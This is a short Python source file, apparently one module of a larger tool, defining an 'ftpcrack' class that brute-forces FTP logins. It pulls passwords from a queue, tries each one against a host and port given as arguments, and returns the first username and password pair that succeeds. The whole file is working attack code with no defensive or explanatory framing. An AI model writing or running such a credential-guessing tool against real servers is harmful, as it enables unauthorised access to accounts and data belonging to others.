import time
import ftplib

class ftpcrack:
    def __init__(self,args):
        self.args=args

    def run(self,passwd_list,result,username):
        while True:
            try:
                passwd=passwd_list.get(timeout=1)
            except:
                time.sleep(0.5)
                result.put(1)                
                exit(1)
            try:
                f=ftplib.FTP()
                f.connect(self.args[1],int(self.args[2]))
                f.login(username,passwd)
                result.put((username,passwd))
                time.sleep(0.5)
                exit(1)
            except Exception as e:
                print("ERROT----- (Username:%s  Passwd:%s)" %(username,passwd))






